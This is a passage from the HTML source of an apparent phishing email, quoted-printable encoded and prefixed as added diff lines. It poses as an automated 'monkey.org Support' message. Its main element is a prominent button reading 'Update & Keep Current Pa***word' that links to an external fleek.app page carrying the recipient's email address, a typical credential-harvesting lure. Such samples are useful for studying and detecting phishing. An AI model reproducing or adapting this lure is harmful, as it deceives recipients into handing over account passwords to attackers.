+style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !im=
+portant; OUTLINE-STYLE: none !important"></SPAN></SPAN><BR style=3D"BOX-SIZ=
+ING: border-box; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !imp=
+ortant"><BR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium !importa=
+nt; OUTLINE-STYLE: none !important">
+<BR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium !important; OUTL=
+INE-STYLE: none !important">
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP: rgb(=
+0,115,255) 1px solid; BORDER-RIGHT: rgb(0,115,255) 1px solid; WIDTH: 368px;=
+ BORDER-BOTTOM: rgb(0,115,255) 1px solid; COLOR: rgb(255,255,255); OUTLINE-=
+WIDTH: medium !important; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; OUTLINE-=
+STYLE: none !important; PADDING-LEFT: 18px; MIN-HEIGHT: 32px; BORDER-LEFT: =
+rgb(0,115,255) 1px solid; LINE-HEIGHT: 27px; PADDING-RIGHT: 18px; BACKGROUN=
+D-COLOR: rgb(0,115,255); border-image: none"=20
+href=3D"https://hollow-article-noisy.on-fleek.app/index.xhtml#jose@monkey.o=
+rg" rel=3Dnoreferrer target=3D_blank>Update &amp; Keep&nbsp;Current Pa***wo=
+rd</A>&nbsp;<BR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium !imp=
+ortant; OUTLINE-STYLE: none !important"><BR style=3D"BOX-SIZING: border-box=
+; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><BR sty=
+le=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium !important; OUTLINE-STY=
+LE: none !important">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: medi=
+um !important; OUTLINE-STYLE: none !important"><SPAN style=3D"BOX-SIZING: b=
+order-box">monkey.org&nbsp;</SPAN>Support&nbsp;Automated Message.</SPAN></P=
+></BODY></HTML>
+
